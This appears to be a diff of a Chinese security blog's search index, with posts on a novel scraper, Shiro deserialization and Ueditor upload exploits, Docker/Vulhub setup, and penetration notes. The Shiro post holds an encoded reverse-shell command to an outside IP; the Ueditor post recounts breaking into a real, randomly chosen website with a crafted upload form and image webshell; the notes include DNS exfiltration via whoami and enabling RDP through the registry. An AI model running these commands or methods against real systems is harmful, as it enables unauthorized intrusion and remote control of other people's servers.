class="line">    con = &#x27;&#x27;</span><br><span class="line">    reponse = requests.get(url=url, headers=headers)</span><br><span class="line">    # 获取当前页面编码格式</span><br><span class="line">    code = reponse.encoding</span><br><span class="line">    # 对响应包的内容解码</span><br><span class="line">    page_text = reponse.text.encode(code).decode(&#x27;gbk&#x27;)</span><br><span class="line">    # 使用bs获取指定标签内容（需绑定解析器lxml）</span><br><span class="line">    soup = BeautifulSoup(page_text, &quot;lxml&quot;).select(&#x27;.onearcxsbd &gt; p&#x27;)</span><br><span class="line">    for i in soup:</span><br><span class="line">        # print(i.text)</span><br><span class="line">        con = con + i.text</span><br><span class="line">    return con</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 程序入口</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    url = &#x27;https://www.xyyuedu.com/gdmz/sidamingzhu/sgyy/&#x27;      # 目标地址</span><br><span class="line">    reponse = requests.get(url=url, headers=headers)            # 获取请求</span><br><span class="line">    # print(reponse.text)</span><br><span class="line">    code = reponse.encoding                                     # 获取编码方式</span><br><span class="line">    # code = reponse.apparent_encoding</span><br><span class="line">    # print(code)</span><br><span class="line">    page_text = reponse.text.encode(code).decode(&#x27;gbk&#x27;)         # 先以网页原编码方式编码，在以指定格式解码，注意，数据仅以编码方式存储，但未进行编码</span><br><span class="line">    # print(page_text)</span><br><span class="line"></span><br><span class="line">    soup = BeautifulSoup(page_text, &quot;lxml&quot;)                     # 创建soup对象并指定解析器</span><br><span class="line">    aAttr = soup.select(&#x27;.zhangjie2 &gt; li &gt; a&#x27;)                  # 获得url所在的标签信息</span><br><span class="line">    # print(aAttr)</span><br><span class="line"></span><br><span class="line">    for i in aAttr:</span><br><span class="line">        # print(i.text)</span><br><span class="line">        title = i.text</span><br><span class="line">        link = &#x27;https://www.xyyuedu.com&#x27; + i[&#x27;href&#x27;]        # 获取章节连接</span><br><span class="line">        content = page_link(link)</span><br><span class="line">        print(&#x27;开始下载 \n&#x27; + title)</span><br><span class="line">        # print(title)</span><br><span class="line">        # print(link)</span><br><span class="line">        # print(content)</span><br><span class="line">        with open(&#x27;./三国演义.txt&#x27;, &#x27;a&#x27;, encoding=&#x27;utf-8&#x27;) as fp:</span><br><span class="line">            fp.write(title + &#x27;\n&#x27; + content + &#x27;\n\n\n&#x27;)</span><br><span class="line">            print(title + &#x27;\n&#x27; + &#x27;下载结束&#x27; + &#x27;\n&#x27;)</span><br></pre>
-
-<h1 id="4、下载"><a href="#4、下载" class="headerlink" title="4、下载"></a>4、下载</h1><p><a href="https://www.zerochen.top/download/Scan/pc_sg.py">https://www.zerochen.top/download/Scan/pc_sg.py</a></p>
-]]></content>
-      <categories>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>爬虫</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Shiro反序列化漏洞复现</title>
-    <url>/article/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="1、探测"><a href="#1、探测" class="headerlink" title="1、探测"></a>1、探测</h1><p>在登录界面回包中，有rememberMe=deleteMe参数，说明使用Shiro反序列化。</p>
-<h1 id="2、利用"><a href="#2、利用" class="headerlink" title="2、利用"></a>2、利用</h1><p>a、使用shiroExploit工具检测，反弹shell</p>
-<pre class="highlight"><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre>
-
-<p>b、使用xray检测，直接发送payload</p>
-<pre class="highlight"><span class="line">xray webscan --url &quot;http://&quot; --html-output 1.html</span><br></pre>
-
-<p>或指定脚本检测</p>
-<pre class="highlight"><span class="line">xray webscan --url &quot;http://&quot; --plugins shiro --html-output 1.html</span><br></pre>
-
-<p>将发包贴入burpsuite发包，将Testecho: namzzg修改为Testcmd:ls即可执行对应指令，也可反弹shell，语句同上</p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>Shiro</tag>
       </tags>
   </entry>
   <entry>
@@ -5254,6 +5232,103 @@
       </tags>
   </entry>
   <entry>
+    <title>Shiro反序列化漏洞复现</title>
+    <url>/article/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="1、探测"><a href="#1、探测" class="headerlink" title="1、探测"></a>1、探测</h1><p>在登录界面回包中，有rememberMe=deleteMe参数，说明使用Shiro反序列化。</p>
+<h1 id="2、利用"><a href="#2、利用" class="headerlink" title="2、利用"></a>2、利用</h1><p>a、使用shiroExploit工具检测，反弹shell</p>
+<pre class="highlight"><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre>
+
+<p>b、使用xray检测，直接发送payload</p>
+<pre class="highlight"><span class="line">xray webscan --url &quot;http://&quot; --html-output 1.html</span><br></pre>
+
+<p>或指定脚本检测</p>
+<pre class="highlight"><span class="line">xray webscan --url &quot;http://&quot; --plugins shiro --html-output 1.html</span><br></pre>
+
+<p>将发包贴入burpsuite发包，将Testecho: namzzg修改为Testcmd:ls即可执行对应指令，也可反弹shell，语句同上</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Shiro</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Ueditor漏洞复现</title>
+    <url>/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>闲来无事，逛逛补天。随机选取一个不要钱的幸运儿，fofa资产收集，发现一个域名下，存在目录遍历漏洞。emmm，暴露无遗呀，不拿下简直对不起这个遍历漏洞。众多备份文件，嗯，不会逆向源码，放过；一个上传入口，一个传了没执行权限，一个接口错误，一个不记得了。。。年龄大了，一晚上过去就忘记了，嘤嘤嘤。好了，继续，发现一个usditor编辑器，百度一波，其实是百度的ueditor富文本编辑器。现学现卖，开始。</p>
+<p><img src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730085813949.png" alt="image-20210730085813949" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730085813949.png" class="lozad post-image"></p>
+<h1 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h1><p>1、发现存在ueditor文本编辑器</p>
+<p> <img src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151403335.png" alt="image-20210810151403335" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151403335.png" class="lozad post-image"></p>
+<p>2、漏洞探测</p>
+<p>访问url</p>
+<pre class="highlight"><span class="line">/usditor/net/controller.ashx?action=catchimage</span><br></pre>
+
+<p>返回</p>
+<pre class="highlight"><span class="line">&#123;&quot;state&quot;:&quot;参数错误：没有指定抓取源&quot;&#125;</span><br></pre>
+
+<p>说明存在编辑器文件上传漏洞。</p>
+<p><img src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730090222390.png" alt="image-20210730090222390" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730090222390.png" class="lozad post-image"></p>
+<p>3、构造上传入口</p>
+<pre class="highlight"><span class="line">&lt;form action=&quot;xx/usditor/net/controller.ashx?action=catchimage&quot; enctype=&quot;application/x-www-form-urlencoded&quot;  method=&quot;POST&quot;&gt;</span><br><span class="line">&lt;p&gt;shell addr: &lt;input type=&quot;text&quot; name=&quot;source[]&quot; /&gt;&lt;/p &gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre>
+
+<p>注：action的通用地址应为：</p>
+<pre class="highlight"><span class="line">http://xxx.com/ueditor/net/controller.ashx?action=catchimage</span><br></pre>
+
+<p><img src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151430644.png" alt="image-20210810151430644" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151430644.png" class="lozad post-image"></p>
+<p>4、上传公网服务器aspx图片马，并用<code>?.aspx</code>连接，即<code>http://x/x.jpg?.aspx</code></p>
+<p><img src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151439843.png" alt="image-20210810151439843" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151439843.png" class="lozad post-image"></p>
+<p>注：必须为公网服务器</p>
+<p>5、返回图片马路径</p>
+<p>应为<code>/usditor/net/upload/image/20210729/6376...09895.aspx</code></p>
+<p><img src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730090908140.png" alt="image-20210730090908140" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730090908140.png" class="lozad post-image"></p>
+<p>6、蚁剑连接，getshell</p>
+<p> <img src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151458628.png" alt="image-20210810151458628" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151458628.png" class="lozad post-image"></p>
+<h1 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h1><p>这里补充下上传拦截规则，前面提到，发现过其他上传入口，也上传过aspx图片马，这里只做了Content-Type，即文件类型检测。编辑器这里也一样。对于文件上传漏洞来说，没什么难度，对于Ueditor编辑器漏洞来说，这里还有几个坑点。</p>
+<p>1、服务器必须为国内公网服务器，不然会上传失败。</p>
+<p>2、返回的路径<code>/upload/image/20210729/6376...09895.aspx</code>为当前目录下的路径，即<code>/usditor/net/upload/image/20210729/6376...09895.aspx</code>,前面如有路径都应加上，而不是根目录下的upload路径。</p>
+<p>3、到这里忽然想起来，第三个上传点，当时传上去了，但是没有找到路径，就没有继续做，没想到传到这里来了<img src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151516892.png" alt="image-20210810151516892" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151516892.png" class="lozad post-image"></p>
+<p>哦对，根目录下发现一个K8脱库大马，尝试密码K8team成功进入，然后顺手提交了挂马漏洞。嗯，作为一名白帽子，一定要从入门开始养成习惯。</p>
+<p> <img src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730092037287.png" alt="image-20210730092037287" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730092037287.png" class="lozad post-image"></p>
+<p>————————————————————————————————————————————————————————————</p>
+<p>嗯，洞没过，大意了。补天先过了挂马洞，编辑器洞来回折腾了几天。然后，编辑器洞和挂马洞一起被修了，提交失败。害~利人不利己。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Ueditor</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>搭建Docker + Vulhub</title>
+    <url>/article/Ubuntu%E6%90%AD%E5%BB%BADocker-Vulhub/</url>
+    <content><![CDATA[<h1 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h1><pre class="highlight"><span class="line">sudo apt install docker.io -y</span><br><span class="line">yum install docker  	# centos	</span><br><span class="line">docker -v	#查看版本</span><br></pre>
+
+<p>安装pip</p>
+<pre class="highlight"><span class="line">sudo apt install python3-pip -y</span><br></pre>
+
+<h1 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h1><pre class="highlight"><span class="line">pip3 install docker-compose</span><br><span class="line">docker-compose -v		#查看版本</span><br></pre>
+
+<p>拉取vulhub</p>
+<pre class="highlight"><span class="line">git clone https://github.com/vulhub/vulhub.git		#在桌面环境</span><br></pre>
+
+
+
+<h1 id="Docker命令"><a href="#Docker命令" class="headerlink" title="Docker命令"></a>Docker命令</h1><pre class="highlight"><span class="line">docker pull xx:latest		# 安装xx镜像</span><br><span class="line">docker images				# 查看安装的镜像</span><br><span class="line">docker run -it -d -p 6379:6379 redis		# 运行镜像</span><br></pre>
+
+
+
+<h1 id="Docker-compose命令"><a href="#Docker-compose命令" class="headerlink" title="Docker-compose命令"></a>Docker-compose命令</h1><pre class="highlight"><span class="line">docker-compose up -d		#拉起容器镜像</span><br><span class="line">docker-compose down 		#关闭容器镜像</span><br></pre>
+]]></content>
+      <categories>
+        <category>环境搭建</category>
+      </categories>
+      <tags>
+        <tag>Docker</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>TOP10漏洞探测点</title>
     <url>/article/TOP10%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B%E7%82%B9/</url>
     <content><![CDATA[<table>
@@ -5316,106 +5391,6 @@
       </categories>
       <tags>
         <tag>思路</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Web渗透随记</title>
-    <url>/article/Web%E6%B8%97%E9%80%8F%E9%9A%8F%E8%AE%B0/</url>
-    <content><![CDATA[<h1 id="DNS外带"><a href="#DNS外带" class="headerlink" title="DNS外带"></a>DNS外带</h1><p>平台：</p>
-<p><a href="http://dnslog.cn/">http://dnslog.cn/</a> #需要生成随机DNS</p>
-<p>使用：</p>
-<pre class="highlight"><span class="line">ping `whoami`.dns</span><br></pre>
-
-<p>（注：``为优先运行符，可以用$()代替）</p>
-<p>适用：</p>
-<p>注入、反序列化、命令执行等无回显情况下，外带数据看结果</p>
-<h1 id="Windows开启3389端口"><a href="#Windows开启3389端口" class="headerlink" title="Windows开启3389端口"></a>Windows开启3389端口</h1><p>注：Win7、Win2003、XP系统</p>
-<p>开启：</p>
-<pre class="highlight"><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre>
-
-<p>关闭：</p>
-<pre class="highlight"><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</span><br></pre>
-]]></content>
-      <categories>
-        <category>Web渗透</category>
-      </categories>
-      <tags>
-        <tag>随记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>搭建Docker + Vulhub</title>
-    <url>/article/Ubuntu%E6%90%AD%E5%BB%BADocker-Vulhub/</url>
-    <content><![CDATA[<h1 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h1><pre class="highlight"><span class="line">sudo apt install docker.io -y</span><br><span class="line">yum install docker  	# centos	</span><br><span class="line">docker -v	#查看版本</span><br></pre>
-
-<p>安装pip</p>
-<pre class="highlight"><span class="line">sudo apt install python3-pip -y</span><br></pre>
-
-<h1 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h1><pre class="highlight"><span class="line">pip3 install docker-compose</span><br><span class="line">docker-compose -v		#查看版本</span><br></pre>
-
-<p>拉取vulhub</p>
-<pre class="highlight"><span class="line">git clone https://github.com/vulhub/vulhub.git		#在桌面环境</span><br></pre>
-
-
-
-<h1 id="Docker命令"><a href="#Docker命令" class="headerlink" title="Docker命令"></a>Docker命令</h1><pre class="highlight"><span class="line">docker pull xx:latest		# 安装xx镜像</span><br><span class="line">docker images				# 查看安装的镜像</span><br><span class="line">docker run -it -d -p 6379:6379 redis		# 运行镜像</span><br></pre>
-
-
-
-<h1 id="Docker-compose命令"><a href="#Docker-compose命令" class="headerlink" title="Docker-compose命令"></a>Docker-compose命令</h1><pre class="highlight"><span class="line">docker-compose up -d		#拉起容器镜像</span><br><span class="line">docker-compose down 		#关闭容器镜像</span><br></pre>
-]]></content>
-      <categories>
-        <category>环境搭建</category>
-      </categories>
-      <tags>
-        <tag>Docker</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Ueditor漏洞复现</title>
-    <url>/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>闲来无事，逛逛补天。随机选取一个不要钱的幸运儿，fofa资产收集，发现一个域名下，存在目录遍历漏洞。emmm，暴露无遗呀，不拿下简直对不起这个遍历漏洞。众多备份文件，嗯，不会逆向源码，放过；一个上传入口，一个传了没执行权限，一个接口错误，一个不记得了。。。年龄大了，一晚上过去就忘记了，嘤嘤嘤。好了，继续，发现一个usditor编辑器，百度一波，其实是百度的ueditor富文本编辑器。现学现卖，开始。</p>
-<p><img src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730085813949.png" alt="image-20210730085813949" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730085813949.png" class="lozad post-image"></p>
-<h1 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h1><p>1、发现存在ueditor文本编辑器</p>
-<p> <img src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151403335.png" alt="image-20210810151403335" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151403335.png" class="lozad post-image"></p>
-<p>2、漏洞探测</p>
-<p>访问url</p>
-<pre class="highlight"><span class="line">/usditor/net/controller.ashx?action=catchimage</span><br></pre>
-
-<p>返回</p>
-<pre class="highlight"><span class="line">&#123;&quot;state&quot;:&quot;参数错误：没有指定抓取源&quot;&#125;</span><br></pre>
-
-<p>说明存在编辑器文件上传漏洞。</p>
-<p><img src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730090222390.png" alt="image-20210730090222390" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730090222390.png" class="lozad post-image"></p>
-<p>3、构造上传入口</p>
-<pre class="highlight"><span class="line">&lt;form action=&quot;xx/usditor/net/controller.ashx?action=catchimage&quot; enctype=&quot;application/x-www-form-urlencoded&quot;  method=&quot;POST&quot;&gt;</span><br><span class="line">&lt;p&gt;shell addr: &lt;input type=&quot;text&quot; name=&quot;source[]&quot; /&gt;&lt;/p &gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre>
-
-<p>注：action的通用地址应为：</p>
-<pre class="highlight"><span class="line">http://xxx.com/ueditor/net/controller.ashx?action=catchimage</span><br></pre>
-
-<p><img src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151430644.png" alt="image-20210810151430644" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151430644.png" class="lozad post-image"></p>
-<p>4、上传公网服务器aspx图片马，并用<code>?.aspx</code>连接，即<code>http://x/x.jpg?.aspx</code></p>
-<p><img src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151439843.png" alt="image-20210810151439843" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151439843.png" class="lozad post-image"></p>
-<p>注：必须为公网服务器</p>
-<p>5、返回图片马路径</p>
-<p>应为<code>/usditor/net/upload/image/20210729/6376...09895.aspx</code></p>
-<p><img src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730090908140.png" alt="image-20210730090908140" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730090908140.png" class="lozad post-image"></p>
-<p>6、蚁剑连接，getshell</p>
-<p> <img src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151458628.png" alt="image-20210810151458628" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151458628.png" class="lozad post-image"></p>
-<h1 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h1><p>这里补充下上传拦截规则，前面提到，发现过其他上传入口，也上传过aspx图片马，这里只做了Content-Type，即文件类型检测。编辑器这里也一样。对于文件上传漏洞来说，没什么难度，对于Ueditor编辑器漏洞来说，这里还有几个坑点。</p>
-<p>1、服务器必须为国内公网服务器，不然会上传失败。</p>
-<p>2、返回的路径<code>/upload/image/20210729/6376...09895.aspx</code>为当前目录下的路径，即<code>/usditor/net/upload/image/20210729/6376...09895.aspx</code>,前面如有路径都应加上，而不是根目录下的upload路径。</p>
-<p>3、到这里忽然想起来，第三个上传点，当时传上去了，但是没有找到路径，就没有继续做，没想到传到这里来了<img src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151516892.png" alt="image-20210810151516892" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151516892.png" class="lozad post-image"></p>
-<p>哦对，根目录下发现一个K8脱库大马，尝试密码K8team成功进入，然后顺手提交了挂马漏洞。嗯，作为一名白帽子，一定要从入门开始养成习惯。</p>
-<p> <img src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730092037287.png" alt="image-20210730092037287" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730092037287.png" class="lozad post-image"></p>
-<p>————————————————————————————————————————————————————————————</p>
-<p>嗯，洞没过，大意了。补天先过了挂马洞，编辑器洞来回折腾了几天。然后，编辑器洞和挂马洞一起被修了，提交失败。害~利人不利己。</p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>Ueditor</tag>
       </tags>
   </entry>
   <entry>
@@ -5801,54 +5776,103 @@
       </tags>
   </entry>
   <entry>
-    <title>Windows搭建IIS+MSSql</title>
-    <url>/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/</url>
-    <content><![CDATA[<h1 id="一、搭建IIS服务"><a href="#一、搭建IIS服务" class="headerlink" title="一、搭建IIS服务"></a>一、搭建IIS服务</h1><h2 id="1、搭建IIS服务"><a href="#1、搭建IIS服务" class="headerlink" title="1、搭建IIS服务"></a>1、搭建IIS服务</h2><p>开始-管理工具-服务器管理器-角色-IIS服务-自定义服务（ASP模块、FTP模块等）</p>
-<h2 id="2、导入ASP网站"><a href="#2、导入ASP网站" class="headerlink" title="2、导入ASP网站"></a>2、导入ASP网站</h2><p>选择网站路径</p>
-<p>修改网站访问端口号</p>
-<h2 id="3、网站配置"><a href="#3、网站配置" class="headerlink" title="3、网站配置"></a>3、网站配置</h2><table>
+    <title>Web渗透随记</title>
+    <url>/article/Web%E6%B8%97%E9%80%8F%E9%9A%8F%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id="DNS外带"><a href="#DNS外带" class="headerlink" title="DNS外带"></a>DNS外带</h1><p>平台：</p>
+<p><a href="http://dnslog.cn/">http://dnslog.cn/</a> #需要生成随机DNS</p>
+<p>使用：</p>
+<pre class="highlight"><span class="line">ping `whoami`.dns</span><br></pre>
+
+<p>（注：``为优先运行符，可以用$()代替）</p>
+<p>适用：</p>
+<p>注入、反序列化、命令执行等无回显情况下，外带数据看结果</p>
+<h1 id="Windows开启3389端口"><a href="#Windows开启3389端口" class="headerlink" title="Windows开启3389端口"></a>Windows开启3389端口</h1><p>注：Win7、Win2003、XP系统</p>
+<p>开启：</p>
+<pre class="highlight"><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre>
+
+<p>关闭：</p>
+<pre class="highlight"><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</span><br></pre>
+]]></content>
+      <categories>
+        <category>Web渗透</category>
+      </categories>
+      <tags>
+        <tag>随记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows随记</title>
+    <url>/article/Windows%E9%9A%8F%E8%AE%B0/</url>
+    <content><![CDATA[<table>
 <thead>
 <tr>
-<th align="left">报错类型</th>
-<th align="left">做法</th>
+<th align="left">命令</th>
+<th align="left">说明</th>
 </tr>
 </thead>
 <tbody><tr>
-<td align="left">403（无访问主程序）</td>
-<td align="left">修改默认文档，增加index.asp</td>
+<td align="left">netstat -r</td>
+<td align="left">列出当前路由信息</td>
 </tr>
 <tr>
-<td align="left">500（无法访问文件）</td>
-<td align="left">ASP-启用父路径</td>
+<td align="left">dir</td>
+<td align="left">显示文件列表，同linux下ls</td>
 </tr>
 <tr>
-<td align="left">提示未启用32位程序池</td>
-<td align="left">应用程序池-网站-高级设置-32位应用程序池-True</td>
+<td align="left">mkdir或mk</td>
+<td align="left">创建目录</td>
 </tr>
 <tr>
-<td align="left">没有操作权限</td>
-<td align="left">修改www目录权限： 属性-安全-编辑-修改Users权限为完全控制</td>
+<td align="left">rmdir或rd</td>
+<td align="left">删除目录</td>
+</tr>
+<tr>
+<td align="left">copy</td>
+<td align="left">复制，需要指定目录</td>
+</tr>
+<tr>
+<td align="left">del</td>
+<td align="left">删除</td>
+</tr>
+<tr>
+<td align="left">touch</td>
+<td align="left">创建文件</td>
+</tr>
+<tr>
+<td align="left">ren</td>
+<td align="left">重命名</td>
+</tr>
+<tr>
+<td align="left">type</td>
+<td align="left">查看文本文件</td>
 </tr>
 </tbody></table>
-<h1 id="安装SQL-Server数据库并导入原有数据库"><a href="#安装SQL-Server数据库并导入原有数据库" class="headerlink" title="安装SQL Server数据库并导入原有数据库"></a>安装SQL Server数据库并导入原有数据库</h1><p>1、winserver2008连接sql server镜像，选择安装（精简功能）</p>
